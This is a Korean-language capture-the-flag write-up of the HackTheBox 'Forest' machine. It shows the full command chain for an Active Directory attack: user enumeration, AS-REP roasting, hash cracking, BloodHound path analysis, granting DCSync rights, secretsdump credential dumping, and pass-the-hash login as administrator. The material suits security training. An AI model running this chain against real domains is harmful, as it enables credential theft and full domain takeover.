# Forest - HackTheBox
## Recon
```bash
sudo nmap -p 135,139,3268,3269,389,445,464,47001,49664,49665,49666,49667,49671,49678,49679,49686,49705,53,593,5985,636,88,9389 -sC -sV -vv -oA forest 10.10.10.161
```
<img width="1102" height="413" alt="image" src="https://github.com/user-attachments/assets/b4e071c9-3322-49cb-a603-06b21a1c9fe7" />
<img width="1102" height="543" alt="image" src="https://github.com/user-attachments/assets/f3a4a6e0-179f-427e-a3fb-57f924eef8ea" />

- KERBEROS(88)
- LDAP(389)
- SMB(445)
- WINRM(5985)

<br>

- `/etc/hosts`에 `FOREST.htb.local` 추가.
<img width="1102" height="61" alt="image" src="https://github.com/user-attachments/assets/6eb6a7fa-99df-412d-966d-3b49ffb8a00f" />

---
## SMB
- `anonymous`로그인 시도 실패.
- `netexec`를 통해서 존재하는 유저 목록 수집.
```bash
netexec smb 10.10.10.161 --users
```
<img width="1102" height="373" alt="image" src="https://github.com/user-attachments/assets/335c9d1b-1824-42ee-8804-2bbf575f672b" />

<br>
<br>

- `SM`과 `Health`로 시작하는 유저들을 제외하고 유저 목록으로 생성.
<img width="1102" height="186" alt="image" src="https://github.com/user-attachments/assets/ab6bb1bb-0d67-4157-9803-02845efb89d8" />

---
## KERBEROS
### AS-REP Roasting
- 비밀번호 혹은 해시를 발견할 수 없어서 `AS-REP Roasting`공격 시도.
- `svc-alfresco`해시 발견.
```bash
for user in $(cat users);do impacket-GetNPUsers -dc-ip 10.10.10.161 -no-pass htb.local/$user;done
```
<img width="1102" height="455" alt="image" src="https://github.com/user-attachments/assets/46baab27-5df6-49a5-abb6-69da06d49ac4" />

<br>
<br>

- 크래킹.
```bash
john hash --wordlist=~/util/rockyou.txt
```
<img width="1102" height="220" alt="image" src="https://github.com/user-attachments/assets/a533d6d9-4f6b-494a-8c10-4ce8f3eafec2" />

<br>
<br>

- 로그인 시도 성공.
```bash
netexec smb 10.10.10.161 -u 'svc-alfresco' -p 's3rvice'
```
<img width="1102" height="110" alt="image" src="https://github.com/user-attachments/assets/9a63d4c1-811a-4adc-b20c-00afe666857e" />

---
## WINRM
- `winrm` 로그인 시도 성공.
```bash
netexec winrm 10.10.10.161 -u 'svc-alfresco' -p 's3rvice'
```
<img width="1102" height="171" alt="image" src="https://github.com/user-attachments/assets/b64e6ec1-12da-489e-ad3d-f1a28bbb40ef" />

<br>
<br>

- `winrm` 접속.
```bash
netexec winrm 10.10.10.161 -u 'svc-alfresco' -p 's3rvice'
```
<img width="1103" height="448" alt="image" src="https://github.com/user-attachments/assets/11e3fb05-47d2-4c49-b2c1-cd60b52acb47" />

---
## BloodHound
- `bloodhound-python`로 도메인 정보 수집.
```bash
bloodhound-python -u 'svc-alfresco' -p 's3rvice' -d htb.local -c all --zip -ns 10.10.10.161
```
<img width="1103" height="414" alt="image" src="https://github.com/user-attachments/assets/9a04e76d-4b2a-4cd3-b6c4-99e57df367fc" />

<br>
<br>

- `bloodhound`를 실행하여 `svc-alfresco`유저에서 `administrator`로 가는 경로 확인.
- `svc-alfresco`유저가 `exchange windows permissions`그룹에 대해`genericall`권한 존재.
<img width="1768" height="719" alt="image" src="https://github.com/user-attachments/assets/89deb1d8-f467-4c30-9032-9eeb21ef36e7" />

<br>
<br>

- `exchange windows permissions` 그룹에 `svc-alfresco`를 추가.
```bash
net rpc group addmem 'exchange windows permissions' 'svc-alfresco' -U 'htb.local'/'svc-alfresco'%'s3rvice' -S 10.10.10.161

net rpc group members 'exchange windows permissions' -U 'htb.local'/'svc-alfresco'%'s3rvice' -S 10.10.10.161
```
<img width="1104" height="196" alt="image" src="https://github.com/user-attachments/assets/3979ab61-3260-4490-bbdd-2bf0429b8ed7" />

<br>
<br>

- 도메인에서 group을 초기화를 시키는지 속해있던 그룹에서 빠져 있는 것을 발견.
<img width="1104" height="96" alt="image" src="https://github.com/user-attachments/assets/2ea3dfb4-2c72-4fd0-9367-f39875636012" />

<br>
<br>

- `ex-test:test123`유저 생성.
```powershell
net user ex-teset test123 /add /domain

net user ex-test
```
<img width="1104" height="508" alt="image" src="https://github.com/user-attachments/assets/07cbd630-05fb-46d9-a3bf-933130a34b3d" />

<br>
<br>

- `exchange windows permissions` 그룹에 `ex-test`를 추가.
```bash
net rpc group addmem 'exchange windows permissions' 'ex-test' -U 'htb.local'/'svc-alfresco'%'s3rvice' -S 10.10.10.161

net rpc group members 'exchange windows permissions' -U 'htb.local'/'svc-alfresco'%'s3rvice' -S 10.10.10.161
```
<img width="1104" height="188" alt="image" src="https://github.com/user-attachments/assets/15e0f4e6-b0d7-45a5-aace-c40d1a605b1a" />

<br>
<br>

- `exchange windows permissions`그룹에 속한 `ex-test`는 `htb.local`에 `WriteDacl`권한을 사용할 수 있게 됨.
- `DCSync` 권한을 `ex-test`에 부여.
```bash
impacket-dacledit -action 'write' -rights 'DCSync' -principal 'ex-test' -target-dn 'DC=HTB,DC=LOCAL' 'htb.local'/'ex-test':'test123'
```
<img width="1104" height="151" alt="image" src="https://github.com/user-attachments/assets/8f1ff137-d45c-43af-a5e2-17729418f145" />

<br>
<br>

- `secretsdump`로 덤프.
```bash
impacket-secretsdump 'htb.local'/'ex-test':'test123'@10.10.10.161
```
<img width="1104" height="200" alt="image" src="https://github.com/user-attachments/assets/41147282-7942-4465-9ebe-7e04cfca2d7d" />

<br>
<br>

- `administrator:32693b11e6aa90eb43d32c72a07ceea6`로 접속 가능.
```bash
netexec winrm 10.10.10.161 -u 'administrator' -H '32693b11e6aa90eb43d32c72a07ceea6'
```
<img width="1104" height="228" alt="image" src="https://github.com/user-attachments/assets/b125b8c5-3db7-4db5-8619-5a6b6f24f94a" />

<br>
<br>

- `evil-winrm` 접속.
```bash
evil-winrm -i 10.10.10.161 -u 'administrator' -H '32693b11e6aa90eb43d32c72a07ceea6'
```
<img width="1104" height="275" alt="image" src="https://github.com/user-attachments/assets/af0b9e29-5a2a-4307-8852-fde392d47c6d" />

---
## FLAG
- `c:\users\svc-alfresco\desktop\user.txt`
<img width="1104" height="187" alt="image" src="https://github.com/user-attachments/assets/8c6ddb93-a5de-44a6-8229-53becd3461d3" />

<br>
<br>

- `c:\users\administrator\desktop\root.txt`
<img width="1104" height="187" alt="image" src="https://github.com/user-attachments/assets/76540973-f778-4814-861d-f9be8901bd3f" />


















